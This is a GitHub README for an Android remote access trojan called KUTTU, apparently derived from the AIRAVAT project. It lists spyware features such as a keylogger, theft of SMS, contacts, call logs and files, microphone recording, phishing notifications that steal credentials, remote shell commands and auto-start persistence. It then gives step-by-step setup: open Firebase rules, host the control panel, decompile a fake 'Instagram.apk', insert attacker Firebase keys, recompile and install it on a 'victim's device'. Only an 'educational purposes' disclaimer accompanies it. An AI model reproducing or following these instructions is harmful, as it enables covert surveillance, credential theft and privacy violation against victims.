<p align="center">
  <img width="250" height="250" src="https://media3.giphy.com/media/XALwMpWaCJ5gr4Fcps/giphy.gif?cid=6c09b952upcyl1meas3obbs87sia3e1etx3x9i8ef68mxvwq&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=s">
</p>
<h1 align="center">KUTTU</h1><p align="center">
<b>⚠️Disclaimer : This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.
</p>   

<p align=center>  
<a href=https://www.instagram.com/ashwin_hackr?igsh=MXZxbWVwcWs3bHZuMA==><img src="https://img.shields.io/badge/Author-Ashwin-red.svg?style=for-the-badge&label=Author" /></a>

<img src="https://img.shields.io/badge/Version-1.0-brightgreen?style=for-the-badge" >
</p>   
#### A multifunctional Android RAT with GUI based Web Panel without port forwarding.

> [!IMPORTANT]
> The source code has been published <a href="./ANDROID APP/AIRAVAT.swb" >here</a> use <a href="https://github.com/Sketchware-Pro/Sketchware-Pro" >Sketchware Pro</a> to view the source code.


<div align="center">

</div>

## Features
 - Read all the files of Internal Storage
 - Download Any Media to your Device from Victims Device
 - Get all the system information of Victim Device
 - Retrieve the List of Installed Applications
 - Retrive SMS
 - Retrive Call Logs
 - Retrive Contacts
 - Send SMS
 - Gets all the Notifications 
 - Keylogger
 - Admin Permission 
 - Show Phishing Pages to steal credentials through notification.
    - Steal credentials through pre built phishing pages
    - Open any suspicious website through notification to steal credentials.
 - Record Audio through Mic
 - Play music in Victim's device
 - Vibrate Device
 - Text To Speech 
 - Turn On/Off Torch Light
 - Change Wallpaper
 - Run shell Commands
 - Get Clipboard text (Only When app's Activity is visible)
 - Launch Any URL (Only When app's Activity is visible)
 - Pre Binded with [Instagram Webview Phishing ](https://github.com/Th30neAnd0nly/PI)
 - Runs In Background 
    - Auto Starts on restarting the device
    - Auto Starts when any notification arrives
 - No port forwarding needed

<img align=center src=./.github/img.jpg >


## Requirements
 - Firebase Account
 - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
[ApkTool M](https://maximoff.su/apktool/?lang=en) ( for Android)


## How to Build 
  ### Firebase Setup
 1. Create an Firebase Account and afterwords create a new project with any name.
 1. Enable Firebase Database and Firebase Storage.
 1. In Firebase Database Click on the rules and set `.read` and `.write` to `true`
    - ```js
          {
           "rules": {
                   ".read": "true",
                   ".write": "true"
                    }
          }
      ```
 1. In Firebase Storage allow reads and writes for all paths.
    - ```js
        rules_version = '2';
        service firebase.storage {
        match /b/{bucket}/o {
            match /{allPaths=**} {
               allow read, write 
              }
          }
       }
      ```
 1. Now Go to project overview and create an Android App and download the `google-services.json` file.
 1. Also create a web app and copy the config of webapp.
   ### Panel Setup
 1. You can use Github Pages , Firebase Hosting or any Hosting Website (except 000webhost) for hosting the panel.
 1. Open [index.html](./WEB%20PANEL/index.html) File and from [line number 16](https://github.com/Th30neAnd0nly/AIRAVAT/blob/325ff0befec72a55c273e99a0e06059db9d599fb/WEB%20PANEL/index.html#L16) replace the config with your web app config which you have created on Step 6.
 1. Save the file , Your Panel Setup is completed.
 ### Android RAT
 1. Download [Instagram.apk](./ANDROID%20APP/Instagram.apk)
 1. Decompile it using any Decompiler recommend above.
 1. Now open `res/values/strings.xml` file.
 1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id` with your Firebase Account using `google-services.json` file which you have downloaded on step 5
    - Example 
       ```xml 
       <string name="firebase_database_url">https://your_database_url.firebase.com</string>
       <string name="google_api_key">your_api_key</string>
       <string name="google_app_id">your_app_id</string>
       <string name="google_storage_bucket">your_storage_bucket_url</string>
       <string name="project_id">project_id</string>
       ```
 1. Now compile the code with appt2.
 1. Install the app in victim's device and give all the permissions after that the connection will show up in web panel.
  ### Tutorial Videos
  1. To be updated...

### ❤️Supporters❤️
[![Stargazers repo roster for @th30neand0nly/AIRAVAT](http://reporoster.com/stars/dark/Th30neAnd0nly/AIRAVAT)](https://github.com/Th30neAnd0nly/AIRAVAT/stargazers)

[![Forkers repo roster for @th30neand0nly/AIRAVAT](http://reporoster.com/forks/dark/Th30neAnd0nly/AIRAVAT)](https://github.com/Th30neAnd0nly/AIRAVAT/network/members)



## DISCLAIMER
<p align="center">
 TO BE USED FOR EDUCATIONAL PURPOSES ONLY
</p>
